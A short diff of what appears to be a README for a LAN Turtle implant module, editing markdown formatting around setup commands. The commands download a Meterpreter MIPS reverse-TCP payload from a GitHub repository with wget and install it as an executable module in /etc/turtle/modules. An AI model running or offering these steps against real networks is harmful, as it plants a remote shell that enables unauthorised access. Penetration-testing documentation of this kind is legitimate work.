@@ -8,7 +8,7 @@
 
 **1 - On LAN Turtle: download module from github**<br />
 `wget https://raw.githubusercontent.com/ATTACKnDEFEND/LanTurtle/main/meterpreter-mipsbe-reverse-tcp -O
-meterpreter-mipsbe-reverse-tcp`
+meterpreter-mipsbe-reverse-tcp``<br />
 `mv meterpreter-mipsbe-reverse-tcp /etc/turtle/modules/meterpreter-mipsbe-reverse-tcp`<br />
 `chmod 755 /etc/turtle/modules/meterpreter-mipsbe-reverse-tcp`<br />
 
